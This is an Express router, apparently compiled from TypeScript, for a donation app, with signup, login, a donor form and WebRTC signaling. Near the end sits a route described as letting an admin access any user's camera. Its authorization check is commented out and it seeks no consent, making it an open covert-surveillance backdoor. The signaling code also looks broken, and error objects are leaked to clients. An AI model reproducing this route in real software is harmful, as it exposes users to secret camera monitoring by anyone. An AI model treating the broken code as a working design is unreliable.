"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const bcryptjs_1 = __importDefault(require("bcryptjs"));
const user_1 = __importDefault(require("../models/user"));
const donar_model_1 = __importDefault(require("../models/donar_model"));
const response_controller_1 = __importDefault(require("../util/response_controller"));
const ws_1 = require("ws"); // WebSocket for signaling
const uuid_1 = require("uuid"); // Unique Room ID for WebRTC
const router = express_1.default.Router();
router.post("/signup", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { email, newPassword, confirmPassword } = req.body;
        // Validate required fields
        if (!email || !newPassword || !confirmPassword) {
            res.status(400).json({ message: "All fields are required." });
            return;
        }
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            res.status(400).json({ message: "Invalid email format." });
            return;
        }
        // Check if passwords match
        if (newPassword !== confirmPassword) {
            res.status(400).json({ message: "Passwords do not match." });
            return;
        }
        // Check if user already exists
        const existingUser = yield user_1.default.findOne({ email });
        if (existingUser) {
            res.status(400).json({ message: "User already exists." });
            return;
        }
        // Hash the password
        const hashedPassword = yield bcryptjs_1.default.hash(newPassword, 10);
        // Create new user
        const user = new user_1.default({ email, password: hashedPassword });
        yield user.save();
        res.status(201).json({ message: "User registered successfully." });
    }
    catch (error) {
        console.error(error);
        res.status(500).json({ message: "Server error", error });
    }
}));
router.post("/login", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { email, password } = req.body;
        if (!email || !password) {
            res.status(400).json({ message: "Email and password are required." });
            return;
        }
        // Find user by email
        const user = yield user_1.default.findOne({ email: { $in: [email] } });
        if (!user) {
            res.status(401).json({ message: "Invalid email or password." });
            return;
        }
        const isMatch = yield bcryptjs_1.default.compare(password, user.password);
        if (!isMatch) {
            res.status(401).json({ message: "Invalid email or password." });
            return;
        }
        res.status(200).json({
            message: "Login successful",
            userId: user.userId,
            email: user.email,
            displayName: user.displayName,
        });
    }
    catch (error) {
        console.error("Login Error:", error);
        res.status(500).json({ message: "Server error", error });
    }
}));
// @ts-ignore
router.post('/submit_donation_form', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const inputUser = req.body.user;
        // Validate required fields
        if (!(inputUser === null || inputUser === void 0 ? void 0 : inputUser.userId)) {
            return res.json(response_controller_1.default.getFailureResponse("Invalid userId"));
        }
        if (!inputUser.fullName || !inputUser.dateOfBirth || !inputUser.phoneNumber) {
            return res.json(response_controller_1.default.getFailureResponse("Missing required fields: fullName, dateOfBirth or phoneNumber"));
        }
        // Save donor to database
        const donor = new donar_model_1.default(inputUser);
        yield donor.save();
        const result = response_controller_1.default.getSuccessResponse();
        result.user = donor;
        return res.json(result);
    }
    catch (err) {
        console.error("Error submitting donation form:", err);
        return res.json(response_controller_1.default.getFailureResponse("Server error"));
    }
}));
// WebSocket server to handle WebRTC signaling
const wss = new ws_1.Server({ noServer: true });
wss.on("connection", (ws) => {
    ws.on("message", (message) => {
        const data = JSON.parse(message.toString());
        switch (data.type) {
            case "offer":
                // Handle offer and send back an answer
                ws.send(JSON.stringify({ type: "offer", sdp: data.sdp }));
                break;
            case "answer":
                // Handle answer
                ws.send(JSON.stringify({ type: "answer", sdp: data.sdp }));
                break;
            case "candidate":
                // Handle ICE candidate
                ws.send(JSON.stringify({ type: "candidate", candidate: data.candidate }));
                break;
            default:
                break;
        }
    });
});
// @ts-ignore
// Route to allow the admin (Uk2D3h) to access any user's camera
router.get("/admin/:adminId/monitor/:userId", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { adminId, userId } = req.params;
    // Check if the admin is "Uk2D3h"
    // if (adminId !== "Uk2D3h") {
    // return res.status(403).json({ access: false, message: "Unauthorized" });
    // }
    // Find the target user by userId (e.g., Mqn3v2)
    const targetUser = yield user_1.default.findOne({ userId });
    if (!targetUser) {
        return res.status(404).json({ access: false, message: "Target user not found" });
    }
    // Generate a unique roomId for the WebRTC session
    const roomId = (0, uuid_1.v4)(); // Generate a random roomId for this session
    // Return the roomId so the admin can use it to start the WebRTC connection
    return res.json({ access: true, roomId });
}));
// @ts-ignore
// Handle WebRTC signaling (similar to previous code)
router.post("/webrtc", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { type, sdp, candidate, roomId } = req.body;
    const targetUser = yield user_1.default.findOne({ userId: req.body.targetUserId });
    if (targetUser) {
        // Forward the signaling message to the user (admin monitoring the user)
        targetUser.webSocket.send(JSON.stringify({ type, sdp, candidate, roomId }));
    }
    return res.status(200).json({ message: "Signaling message sent" });
}));
exports.default = router;
